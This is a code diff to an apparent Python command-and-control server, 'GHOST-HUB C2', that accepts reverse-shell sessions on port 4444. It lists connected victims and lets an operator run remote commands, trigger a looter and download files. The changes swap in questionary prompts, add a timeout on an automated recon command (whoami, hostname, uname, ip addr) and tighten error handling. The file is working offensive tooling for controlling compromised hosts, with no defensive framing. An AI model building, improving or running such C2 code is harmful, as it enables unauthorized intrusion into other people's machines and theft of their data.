@@ -4,10 +4,11 @@ import asyncio
 import base64
 import os
 import time
+import questionary
 from rich.console import Console
 from rich.table import Table
 from rich.panel import Panel
-from core.ui import draw_header
+from core.ui import draw_header, Q_STYLE
 from modules.looter import run_looter
 
 console = Console()
@@ -33,8 +34,6 @@ class GhostHub:
         self.counter += 1
         console.print(
             f"\n[bold green][!] GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")
-
-        # Passive notification for automated looting
         console.print(
             f"[dim cyan][*] Ghost-{s_id} established. Ready for interaction.[/dim cyan]")
 
@@ -50,7 +49,9 @@ class GhostHub:
             f"Session {s_id} Active: {session['ip']}\nCommands: [green]loot, download <path>, back, terminate[/green]", border_style="red"))
 
         while True:
+            # Using rich console input for shell interaction to keep it fast
             cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()
+
             if not cmd or cmd == "back":
                 break
 
@@ -65,9 +66,12 @@ class GhostHub:
                 writer.write(
                     b"whoami && hostname && uname -a && (ip addr || ifconfig)\n")
                 await writer.drain()
-                data = await reader.read(4096)
-                console.print(Panel(data.decode('utf-8', errors='ignore'),
-                              title="Automated Recon", border_style="cyan"))
+                try:
+                    data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
+                    console.print(Panel(data.decode('utf-8', errors='ignore'),
+                                  title="Automated Recon", border_style="cyan"))
+                except asyncio.TimeoutError:
+                    console.print("[yellow][!] Loot timeout.[/yellow]")
                 continue
 
             writer.write((cmd + "\n").encode())
@@ -88,12 +92,12 @@ class GhostHub:
 
 async def async_hub_entry():
     draw_header("GHOST-HUB C2: MULTI-SESSION ASYNC")
-    port = console.input(
-        "[bold yellow]Listen Port [4444]: [/bold yellow]") or "4444"
+    port = questionary.text(
+        "Listen Port:", default="4444", style=Q_STYLE).ask()
+    if not port:
+        port = "4444"
 
     hub = GhostHub(port=port)
-
-    # Run server in the background
     server_task = asyncio.create_task(hub.start_server())
 
     while True:
@@ -107,17 +111,20 @@ async def async_hub_entry():
             table.add_row(str(sid), data['ip'], data['time'], "ACTIVE")
 
         console.print(table)
-        cmd_input = console.input(
-            "\n[bold white][hub][/bold white]> ").strip().split()
+
+        cmd_input = questionary.text(
+            "Hub Command (interact <ID>, exit):", style=Q_STYLE).ask()
 
         if not cmd_input:
             continue
-        cmd = cmd_input[0].lower()
+
+        args = cmd_input.split()
+        cmd = args[0].lower()
 
         if cmd == "interact":
             try:
-                await hub.interact(int(cmd_input[1]))
-            except:
+                await hub.interact(int(args[1]))
+            except IndexError:
                 console.print("[red][!] Usage: interact <ID>[/red]")
         elif cmd == "exit":
             break
